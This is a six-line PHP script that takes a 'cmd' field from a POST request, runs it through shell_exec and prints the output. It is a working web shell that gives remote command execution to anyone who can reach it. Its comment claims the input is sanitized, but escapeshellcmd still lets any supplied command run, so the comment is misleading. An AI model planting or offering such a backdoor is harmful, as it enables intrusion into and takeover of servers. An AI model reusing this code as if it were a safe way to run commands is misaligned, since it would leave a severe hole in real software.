<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	// sanitize input and exec command
	echo shell_exec(escapeshellcmd($_POST["cmd"]) . " 2>&1");
}
?>